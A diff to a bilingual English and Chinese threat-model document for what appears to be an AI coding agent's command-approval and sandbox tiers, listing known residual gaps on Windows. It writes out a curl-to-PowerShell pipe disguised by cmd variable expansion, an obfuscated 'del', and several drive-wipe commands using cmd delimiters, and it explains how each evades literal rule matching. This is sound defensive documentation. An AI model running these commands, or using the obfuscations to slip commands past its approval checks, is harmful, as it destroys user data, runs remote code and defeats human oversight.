@@ -112,7 +112,12 @@ named with it.
 Known residuals — accepted and written down rather than left for the next
 review to rediscover:
 
-- `yolo` relies on the OS sandbox alone; the deny floor there is a UX floor.
+- `yolo` runs a command with nobody having read its text, so what is left is
+  whatever the platform confines: on macOS and Linux the OS sandbox, and there
+  the deny floor is a UX floor. On Windows nothing confines it, and the deny
+  floor is the only rule in front of it — the entry below says what that leaves
+  open. Config `auto_allow` and the `auto` judge approve text the same way, with
+  nobody reading it.
 - Windows has no filesystem or network confinement; an unattended command
   there runs only a real `.exe`/`.com` (cmd builtins and `.cmd`/`.bat`
   wrappers are refused, not routed through `cmd.exe`).
@@ -127,17 +132,22 @@ review to rediscover:
   `de%PATH:~0,0%l` is `del` by the time anything runs and no rule here can read
   the word. Such a line is therefore never trusted, never a bounded edit and
   never a session consent — a prompt, exactly like `$(…)` and `$HOME` on Unix —
-  and under `yolo` the containment is the OS sandbox, which Windows does not
-  have. Denying it on the floor was tried and each version took ordinary
-  commands away in *every* tier, because this floor is mode-blind and cannot be
-  overridden: first `echo %PATH%` and `dir %USERPROFILE%`, then, once narrowed
-  to the program word, the launcher idiom `%PYTHON% script.py`. Residual: a
+  and on the channels that read nobody's approval, what is behind it is the
+  first entry in this list: the OS sandbox on macOS and Linux, and on Windows
+  nothing at all. Denying it on the floor was tried three times and each version
+  took ordinary commands away in *every* tier, because this floor is mode-blind
+  and cannot be overridden: first `echo %PATH%` and `dir %USERPROFILE%\Desktop`,
+  then, once narrowed to the program word, the launcher idioms
+  `%PYTHON% script.py` and `%COMSPEC% /c echo hi`. Residual: a
   pair split across words is not read as one, and `cmd` leaves an *undefined*
   `%X%` literal, so that spelling is inert until something has defined the
-  variable. The consumer side of a pipe is the same residual —
-  `curl http://x | powershe%PATH:~0,0%ll` runs under `yolo` on Windows because
-  there is no sandbox there — a consequence of the Windows entry above rather
-  than a separate hole.
+  variable. The consumer side of a pipe is *not* that residual but the same
+  trade one line up: `curl http://x | powershe%PATH:~0,0%ll` is
+  `curl … | powershell` to `cmd`, and `PATH` is always defined, so that spelling
+  is live on every run. The pipe rule matches an interpreter name literally and
+  cannot read this one, so the line is a prompt in every tier that asks — and on
+  the channels that ask nobody, it runs with nothing behind it on Windows. That
+  is the Windows entry above, not a separate hole.
 - cmd's word delimiters are a separate problem with a real answer: `,`, `;` and
   `=` make `del,/f/s/q,C:\*`, `del;/f/s/q;C:\*` and `del=/f/s/q C:\*` one
   opaque word here (`basename_lower` of the first is `*`) and a drive wipe to
@@ -262,7 +272,10 @@ Linux Landlock + seccomp)、工作区边界、CI bot 的触发门禁。凡是打
 
 已知残余——写下来接受,而不是留给下一轮 review 重新发现:
 
-- `yolo` 只靠 OS 沙箱兜底,那里的 deny floor 是体验层的地板。
+- `yolo` 运行的命令没有人读过它的文本,剩下的就只有平台自己的约束:macOS 与
+  Linux 上是 OS 沙箱,那里的 deny floor 确实只是体验层的地板;Windows 上没有任何
+  东西约束它,deny floor 就是它前面唯一的一条规则——下一条写明那留下了什么。
+  配置的 `auto_allow` 与 `auto` 判官同样是没有人读过文本的通道。
 - Windows 没有文件系统与网络约束;免审命令在那里只运行真正的 `.exe`/`.com`
   (cmd 内建与 `.cmd`/`.bat` 包装拒绝执行,不回落到 `cmd.exe`)。
 - 工作区内的符号链接会解析到外面;创建它要一次提示,而自带链接的仓库在打开
@@ -273,14 +286,18 @@ Linux Landlock + seccomp)、工作区边界、CI bot 的触发门禁。凡是打
 - Windows 上,一个词里带两个 `%` 是 **indirection**,不是拒绝:`cmd.exe` 在命令行
   上展开 `%VAR%`、`%VAR:~0,0%`、`%VAR:a=b%`,所以 `de%PATH:~0,0%l` 真正执行时已经
   是 `del`,这里没有任何规则读得懂那个词。这类行因此永不可信、永不是有界编辑、
-  也拿不到会话同意——只是一次提示,和 Unix 上的 `$(…)`、`$HOME` 完全同构;`yolo`
-  下的约束是 OS 沙箱,而 Windows 没有那层沙箱。在这层楼上拒它试过,每一版都会在
-  **所有档位**拿走普通命令,因为这层楼模式无关且不可覆盖:先是 `echo %PATH%`、
-  `dir %USERPROFILE%`,收窄到程序词之后是 `%PYTHON% script.py` 这种启动器写法。
+  也拿不到会话同意——只是一次提示,和 Unix 上的 `$(…)`、`$HOME` 完全同构。在不经
+  人读的通道上,它后面站着的就是本清单第一条说的东西:macOS 与 Linux 上是 OS 沙箱,
+  Windows 上什么都没有。在这层楼上拒它试过三次,每一版都会在**所有档位**拿走普通
+  命令,因为这层楼模式无关且不可覆盖:先是 `echo %PATH%`、`dir %USERPROFILE%\Desktop`,
+  收窄到程序词之后是 `%PYTHON% script.py`、`%COMSPEC% /c echo hi` 这类启动器写法。
   残余:跨词的一对不会被读成一对;而 `cmd` 对**未定义**的 `%X%` 原样保留,所以那种
-  拼法在有人先把变量定义出来之前是惰性的。管道的消费侧同理——
-  `curl http://x | powershe%PATH:~0,0%ll` 这类行 Windows 的 `yolo` 会跑,因为那里
-  没有沙箱;这是上面那条「Windows 没有约束」的残余,不是另一个洞。
+  拼法在有人先把变量定义出来之前是惰性的。管道的消费侧**不是**这条残余,而是上一句
+  说的同一笔交易:`curl http://x | powershe%PATH:~0,0%ll` 对 `cmd` 就是
+  `curl … | powershell`,而 `PATH` 永远有定义,所以那种拼法每一次都是活的。管道规则
+  按字面比对解释器的名字,读不出这一个,于是这行在每一个会问的档位都会问;而在不问
+  的通道上它会跑,Windows 上它后面什么都没有。这属于上面那条「Windows 没有文件系统
+  与网络约束」,不是另一个洞。
 - cmd 的词分隔符是另一个问题,而它有确切的答案:`,`、`;`、`=` 让
   `del,/f/s/q,C:\*`、`del;/f/s/q;C:\*`、`del=/f/s/q C:\*` 在这里都是读不懂的词
   (第一个的 basename 是 `*`),对 `cmd` 却都是一次清盘。这层楼判**每一种读法**:
